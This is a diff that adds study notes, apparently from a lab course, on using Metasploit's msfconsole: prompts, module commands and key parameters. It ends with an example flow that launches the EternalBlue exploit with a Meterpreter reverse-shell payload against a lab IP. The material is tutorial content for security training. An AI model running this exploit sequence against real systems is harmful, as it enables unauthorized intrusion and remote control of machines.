@@ -122,3 +122,93 @@ The msfconsole is the primary command-line interface to the Metasploit Framework
 ---
 
 
+### **Key Prompts in Metasploit**
+1. **Regular Command Prompt**: System's shell, not related to Metasploit commands.  
+   Example: `root@ip-10-10-XX-XX:~#`
+
+2. **Metasploit Prompt**: Default Metasploit shell where no module is active.  
+   Example: `msf6 >`
+
+3. **Module Context Prompt**: When a specific module is selected.  
+   Example: `msf6 exploit(windows/smb/ms17_010_eternalblue) >`
+
+4. **Meterpreter Prompt**: When a Meterpreter payload successfully connects to the target system.  
+   Example: `meterpreter >`
+
+5. **Target Shell Prompt**: Command-line access on the compromised target.  
+   Example: `C:\Windows\system32>`
+
+
+### **Common Commands**
+- **`use`**: Enter the context of a specific module.  
+  Example: `use exploit/windows/smb/ms17_010_eternalblue`
+
+- **`show options`**: Display required parameters for a module.  
+
+- **`set`**: Set specific module parameters.  
+  Syntax: `set PARAMETER_NAME VALUE`  
+  Example: `set RHOSTS 10.10.165.39`
+
+- **`unset`**: Clear a parameter value.  
+  Example: `unset RHOSTS`
+
+- **`unset all`**: Clear all set parameters.  
+
+- **`setg`**: Set global parameters for use across all modules.  
+  Example: `setg LHOST 10.10.44.70`
+
+- **`unsetg`**: Clear global parameters.  
+
+- **`back`**: Exit the current module context and return to the Metasploit prompt.
+
+
+### **Frequently Used Parameters**
+1. **RHOSTS**: Target IP address or range (CIDR-supported).  
+   Example: `set RHOSTS 10.10.165.39`
+
+2. **RPORT**: Port on the target system. Default varies by module (e.g., 445 for SMB).  
+   Example: `set RPORT 445`
+
+3. **PAYLOAD**: Payload used with the exploit.  
+   Example: `windows/x64/meterpreter/reverse_tcp`
+
+4. **LHOST**: Local attacker's IP for the reverse connection.  
+   Example: `set LHOST 10.10.44.70`
+
+5. **LPORT**: Local port for the reverse connection.  
+   Example: `set LPORT 4444`
+
+6. **SESSION**: Specify a session ID for post-exploitation modules.
+
+
+### **Running Modules**
+- **`exploit`**: Execute the module.  
+- **`run`**: Alias for `exploit`, typically used for non-exploit modules.  
+
+**Background Execution**:  
+- Use `exploit -z` to run the exploit and background the session automatically.
+
+
+### **Example Flow**
+1. **Set up an exploit module**:
+   ```bash
+   use exploit/windows/smb/ms17_010_eternalblue
+   setg RHOSTS 10.10.165.39
+   set PAYLOAD windows/x64/meterpreter/reverse_tcp
+   set LHOST 10.10.44.70
+   set LPORT 4444
+   exploit
+   ```
+
+2. **Switch to an auxiliary module**:
+   ```bash
+   back
+   use auxiliary/scanner/smb/smb_ms17_010
+   show options
+   ```
+
+3. **Unset global parameters**:
+   ```bash
+   unsetg RHOSTS
+   ```
+
